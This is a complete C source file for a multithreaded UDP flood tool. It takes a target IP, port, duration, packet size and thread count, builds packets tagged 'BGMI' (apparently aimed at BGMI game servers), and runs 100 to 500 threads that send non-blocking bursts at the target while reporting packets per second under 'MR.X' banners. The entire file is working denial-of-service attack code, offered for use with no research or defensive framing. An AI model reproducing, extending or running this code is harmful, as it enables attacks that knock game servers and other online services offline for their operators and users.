#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <signal.h>

#define MIN_TIME 10
#define MAX_TIME 300
#define MIN_PACKET_SIZE 24
#define MAX_PACKET_SIZE 128
#define MIN_THREADS 100
#define MAX_THREADS 200
#define PORT_RANGE 50000
#define MIN_SRC_PORT 10000
#define MAX_SRC_PORT 60000
#define BATCH_UPDATE 10000
#define SOCKET_SNDBUF 65536
#define SOCKET_RCVBUF 32768
#define MAX_TOTAL_THREADS 500
#define STATS_UPDATE_INTERVAL 2
#define RECONNECT_RETRIES 3
#define RECONNECT_INTERVAL 50000

char TARGET_IP[INET_ADDRSTRLEN];
int TARGET_PORT;
int ATTACK_TIME;
int PACKET_SIZE;
int THREAD_COUNT;

_Atomic unsigned long long total_packets = 0;
_Atomic unsigned long long total_bytes = 0;
_Atomic unsigned long long current_pps = 0;
_Atomic unsigned long long peak_pps = 0;
_Atomic int stop_signal = 0;
_Atomic int should_attack = 0;
_Atomic int attack_seconds = 0;

struct sockaddr_in target_addr;

void signal_handler(int sig) {
    atomic_store(&stop_signal, 1);
}

int set_sock_buf(int sock) {
    int sndbuf = SOCKET_SNDBUF;
    int rcvbuf = SOCKET_RCVBUF;
    int opt = 1;
    
    if (setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf)) < 0) {
        sndbuf = 32768;
        if (setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf)) < 0) {
            return -1;
        }
    }
    
    if (setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf)) < 0) {
        rcvbuf = 16384;
        if (setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf)) < 0) {
            return -1;
        }
    }
    
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
    
    return 0;
}

void create_bgmi_packet(char *buf, int size, int thread_id, unsigned int seq) {
    int actual_size = size;
    if (actual_size < MIN_PACKET_SIZE) actual_size = MIN_PACKET_SIZE;
    if (actual_size > MAX_PACKET_SIZE) actual_size = MAX_PACKET_SIZE;
    
    memset(buf, 0, actual_size);
    
    buf[0] = 0x42;
    buf[1] = 0x47;
    buf[2] = 0x4D;
    buf[3] = 0x49;
    
    unsigned int net_seq = htonl(seq + thread_id * 100000);
    memcpy(buf + 4, &net_seq, 4);
    
    unsigned int timestamp = htonl((unsigned int)time(NULL));
    memcpy(buf + 8, &timestamp, 4);
    
    for (int i = 16; i < actual_size; i++) {
        buf[i] = (rand() + i + thread_id + seq) & 0xFF;
    }
}

int reconnect_socket(int *sock) {
    if (*sock >= 0) {
        close(*sock);
        *sock = -1;
    }
    
    int new_sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (new_sock < 0) {
        return -1;
    }
    
    if (set_sock_buf(new_sock) < 0) {
        close(new_sock);
        return -1;
    }
    
    if (fcntl(new_sock, F_SETFL, O_NONBLOCK) < 0) {
        close(new_sock);
        return -1;
    }
    
    struct sockaddr_in src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_port = htons(MIN_SRC_PORT + (rand() % PORT_RANGE));
    src_addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(new_sock, (struct sockaddr*)&src_addr, sizeof(src_addr)) != 0) {
        close(new_sock);
        return -1;
    }
    
    *sock = new_sock;
    return 0;
}

void *direct_attack(void *arg) {
    int thread_idx = *((int *)arg);
    int socks[10];
    char *packets[10];
    int i;
    
    for (i = 0; i < 10; i++) {
        socks[i] = -1;
        packets[i] = NULL;
    }
    
    int allocated = 0;
    for (i = 0; i < 10; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (socks[i] < 0) continue;
        
        if (set_sock_buf(socks[i]) < 0) {
            close(socks[i]);
            socks[i] = -1;
            continue;
        }
        
        if (fcntl(socks[i], F_SETFL, O_NONBLOCK) < 0) {
            close(socks[i]);
            socks[i] = -1;
            continue;
        }
        
        struct sockaddr_in src_addr;
        memset(&src_addr, 0, sizeof(src_addr));
        src_addr.sin_family = AF_INET;
        src_addr.sin_port = htons(MIN_SRC_PORT + (rand() % PORT_RANGE));
        src_addr.sin_addr.s_addr = INADDR_ANY;
        
        if (bind(socks[i], (struct sockaddr*)&src_addr, sizeof(src_addr)) != 0) {
            close(socks[i]);
            socks[i] = -1;
            continue;
        }
        
        packets[i] = malloc(PACKET_SIZE);
        if (!packets[i]) {
            close(socks[i]);
            socks[i] = -1;
            for (int j = 0; j < i; j++) {
                if (packets[j]) free(packets[j]);
            }
            return NULL;
        }
        allocated++;
    }
    
    if (allocated == 0) {
        return NULL;
    }
    
    atomic_store(&should_attack, 1);
    
    unsigned long long local_packets = 0;
    unsigned int seq_counter = thread_idx * 100000;
    unsigned int packets_sent[10] = {0};
    
    while (!atomic_load(&stop_signal)) {
        if (!atomic_load(&should_attack)) {
            usleep(1000);
            continue;
        }
        
        for (i = 0; i < 10 && !atomic_load(&stop_signal); i++) {
            if (socks[i] < 0 || !packets[i]) continue;
            
            if (packets_sent[i] > RECONNECT_INTERVAL) {
                if (reconnect_socket(&socks[i]) == 0) {
                    packets_sent[i] = 0;
                }
            }
            
            create_bgmi_packet(packets[i], PACKET_SIZE, thread_idx + 1000, seq_counter);
            
            int b;
            for (b = 0; b < 50 && !atomic_load(&stop_signal); b++) {
                int ret = sendto(socks[i], packets[i], PACKET_SIZE, MSG_DONTWAIT,
                                (struct sockaddr*)&target_addr, sizeof(target_addr));
                if (ret > 0) {
                    local_packets++;
                    seq_counter++;
                    packets_sent[i]++;
                }
            }
        }
        
        if (local_packets >= BATCH_UPDATE) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_packets * PACKET_SIZE);
            local_packets = 0;
        }
        
        usleep(10);
    }
    
    if (local_packets > 0) {
        atomic_fetch_add(&total_packets, local_packets);
        atomic_fetch_add(&total_bytes, local_packets * PACKET_SIZE);
    }
    
    for (i = 0; i < 10; i++) {
        if (socks[i] >= 0) {
            close(socks[i]);
        }
        if (packets[i]) {
            free(packets[i]);
        }
    }
    
    return NULL;
}

void *attack_thread(void *arg) {
    int tid = *((int *)arg);
    
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        return NULL;
    }
    
    if (set_sock_buf(s) < 0) {
        close(s);
        return NULL;
    }
    
    if (fcntl(s, F_SETFL, O_NONBLOCK) < 0) {
        close(s);
        return NULL;
    }
    
    struct sockaddr_in src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_port = htons(MIN_SRC_PORT + (rand() % PORT_RANGE));
    src_addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(s, (struct sockaddr*)&src_addr, sizeof(src_addr)) < 0) {
        close(s);
        return NULL;
    }
    
    char *packet = malloc(PACKET_SIZE);
    if (!packet) {
        close(s);
        return NULL;
    }
    
    unsigned long long local_packets = 0;
    unsigned int seq_local = tid * 77777;
    unsigned int packets_sent = 0;
    
    while (!atomic_load(&stop_signal)) {
        if (!atomic_load(&should_attack)) {
            usleep(1000);
            continue;
        }
        
        if (packets_sent > RECONNECT_INTERVAL) {
            if (reconnect_socket(&s) < 0) {
                break;
            }
            packets_sent = 0;
        }
        
        create_bgmi_packet(packet, PACKET_SIZE, tid, seq_local);
        
        int b;
        for (b = 0; b < 30 && !atomic_load(&stop_signal); b++) {
            int ret = sendto(s, packet, PACKET_SIZE, MSG_DONTWAIT,
                           (struct sockaddr *)&target_addr, sizeof(target_addr));
            if (ret > 0) {
                local_packets++;
                seq_local++;
                packets_sent++;
            }
        }
        
        if (local_packets >= 5000) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_packets * PACKET_SIZE);
            local_packets = 0;
        }
        
        usleep(100);
    }
    
    if (local_packets > 0) {
        atomic_fetch_add(&total_packets, local_packets);
        atomic_fetch_add(&total_bytes, local_packets * PACKET_SIZE);
    }
    
    free(packet);
    if (s >= 0) {
        close(s);
    }
    return NULL;
}

void *attack_timer(void *arg) {
    for (int sec = 0; sec < ATTACK_TIME && !atomic_load(&stop_signal); sec++) {
        sleep(1);
        atomic_fetch_add(&attack_seconds, 1);
    }
    return NULL;
}

void *stats_monitor(void *arg) {
    unsigned long long prev_packets = atomic_load(&total_packets);
    unsigned long long prev_bytes = atomic_load(&total_bytes);
    time_t last_update = time(NULL);
    
    while (!atomic_load(&stop_signal)) {
        sleep(STATS_UPDATE_INTERVAL);
        
        time_t now = time(NULL);
        int elapsed = (int)(now - last_update);
        if (elapsed <= 0) elapsed = 1;
        
        unsigned long long curr_packets = atomic_load(&total_packets);
        unsigned long long curr_bytes = atomic_load(&total_bytes);
        
        if (curr_packets < prev_packets) {
            prev_packets = curr_packets;
            prev_bytes = curr_bytes;
            last_update = now;
            continue;
        }
        
        unsigned long long packets_diff = curr_packets - prev_packets;
        unsigned long long bytes_diff = curr_bytes - prev_bytes;
        
        double pps = (double)packets_diff / elapsed;
        double megabytes = bytes_diff / (1024.0 * 1024.0);
        
        atomic_store(&current_pps, (unsigned long long)pps);
        
        unsigned long long current_peak = atomic_load(&peak_pps);
        if (pps > current_peak) {
            atomic_store(&peak_pps, (unsigned long long)pps);
        }
        
        printf("🔥  PPS: %.0fK | Peak: %lluK | %.1fMB\n", 
               pps/1000, atomic_load(&peak_pps)/1000, megabytes);
        
        prev_packets = curr_packets;
        prev_bytes = curr_bytes;
        last_update = now;
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    
    if (argc != 6) {
        printf("Usage: %s IP PORT TIME SIZE THREADS\n", argv[0]);
        return 1;
    }
    
    strncpy(TARGET_IP, argv[1], sizeof(TARGET_IP) - 1);
    TARGET_IP[sizeof(TARGET_IP) - 1] = '\0';
    
    char *endptr;
    TARGET_PORT = (int)strtol(argv[2], &endptr, 10);
    if (*endptr != '\0' || TARGET_PORT <= 0 || TARGET_PORT > 65535) {
        printf("Invalid port: %s\n", argv[2]);
        return 1;
    }
    
    ATTACK_TIME = (int)strtol(argv[3], &endptr, 10);
    if (*endptr != '\0' || ATTACK_TIME < MIN_TIME) ATTACK_TIME = MIN_TIME;
    if (ATTACK_TIME > MAX_TIME) ATTACK_TIME = MAX_TIME;
    
    PACKET_SIZE = (int)strtol(argv[4], &endptr, 10);
    if (*endptr != '\0' || PACKET_SIZE < MIN_PACKET_SIZE) PACKET_SIZE = MIN_PACKET_SIZE;
    if (PACKET_SIZE > MAX_PACKET_SIZE) PACKET_SIZE = MAX_PACKET_SIZE;
    
    THREAD_COUNT = (int)strtol(argv[5], &endptr, 10);
    if (*endptr != '\0' || THREAD_COUNT < MIN_THREADS) THREAD_COUNT = MIN_THREADS;
    if (THREAD_COUNT > MAX_THREADS) THREAD_COUNT = MAX_THREADS;
    
#ifdef __linux__
    long max_threads = sysconf(_SC_THREAD_THREADS_MAX);
    if (max_threads > 0 && THREAD_COUNT > max_threads - 50) {
        THREAD_COUNT = max_threads - 50;
    }
    if (THREAD_COUNT > MAX_TOTAL_THREADS) {
        THREAD_COUNT = MAX_TOTAL_THREADS;
    }
#endif
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    
    if (inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr) <= 0) {
        printf("Invalid IP address: %s\n", TARGET_IP);
        return 1;
    }
    
    printf("\n🔥 MR.X FATHER OF TG 🔥\n\n");
    printf("🎯 Target: %s:%d\n", TARGET_IP, TARGET_PORT);
    printf("⏰ Time: %d | 📦 Packet: %d\n", ATTACK_TIME, PACKET_SIZE);
    printf("👥 Threads: %d\n\n", THREAD_COUNT);
    
    struct timeval tv;
    gettimeofday(&tv, NULL);
    srand(tv.tv_usec ^ getpid() ^ ((unsigned int)time(NULL) << 16));
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    atomic_store(&total_packets, 0);
    atomic_store(&total_bytes, 0);
    atomic_store(&current_pps, 0);
    atomic_store(&peak_pps, 0);
    atomic_store(&stop_signal, 0);
    atomic_store(&should_attack, 0);
    atomic_store(&attack_seconds, 0);
    
    pthread_t direct_thread;
    int direct_thread_id = 999999;
    if (pthread_create(&direct_thread, NULL, direct_attack, &direct_thread_id) != 0) {
        printf("Failed to create direct attack thread\n");
        return 1;
    }
    
    pthread_t *threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    int *tids = malloc(THREAD_COUNT * sizeof(int));
    
    if (!threads || !tids) {
        printf("Memory allocation failed\n");
        atomic_store(&stop_signal, 1);
        pthread_join(direct_thread, NULL);
        if (threads) free(threads);
        if (tids) free(tids);
        return 1;
    }
    
    int threads_created = 0;
    for (int i = 0; i < THREAD_COUNT; i++) {
        tids[i] = i;
        if (pthread_create(&threads[i], NULL, attack_thread, &tids[i]) == 0) {
            threads_created++;
        } else {
            tids[i] = -1;
        }
        usleep(1000);
    }
    
    pthread_t timer_thread;
    if (pthread_create(&timer_thread, NULL, attack_timer, NULL) != 0) {
        printf("Failed to create timer thread\n");
        atomic_store(&stop_signal, 1);
    }
    
    pthread_t monitor_thread;
    if (pthread_create(&monitor_thread, NULL, stats_monitor, NULL) != 0) {
        printf("Failed to create monitor thread\n");
        atomic_store(&stop_signal, 1);
    }
    
    atomic_store(&should_attack, 1);
    
    pthread_join(timer_thread, NULL);
    atomic_store(&stop_signal, 1);
    
    pthread_join(direct_thread, NULL);
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        if (tids[i] != -1) {
            pthread_join(threads[i], NULL);
        }
    }
    
    pthread_join(monitor_thread, NULL);
    
    int elapsed = atomic_load(&attack_seconds);
    unsigned long long total_p = atomic_load(&total_packets);
    unsigned long long total_b = atomic_load(&total_bytes);
    
    if (elapsed > 0) {
        double avg_pps = total_p / (double)elapsed;
        double total_gb = total_b / (1024.0 * 1024.0 * 1024.0);
        
        printf("\n🚀 MR.X NEVER END 🚀\n\n");
        printf("✅ Total Packets: %llu\n", total_p);
        printf("🚀 AVERAGE PPS: %.0fK\n", avg_pps/1000);
        printf("💾 Total Data: %.2fGB\n", total_gb);
    }
    
    free(threads);
    free(tids);
    
    return 0;
}